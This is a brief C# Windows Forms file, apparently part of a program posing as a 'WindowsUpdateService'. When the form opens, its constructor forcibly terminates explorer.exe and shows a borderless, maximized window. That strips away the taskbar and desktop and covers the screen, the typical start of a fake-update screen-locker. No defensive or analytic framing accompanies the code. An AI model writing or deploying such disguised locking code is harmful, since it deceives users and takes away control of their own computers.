using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsUpdateService
{
    public partial class Form3 : Form
    {
        public Form3()
        {
            InitializeComponent();
            Process.Start("taskkill", "/F /IM explorer.exe");
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
        }

        private void Form3_Load(object sender, EventArgs e)
        {

        }
    }
}
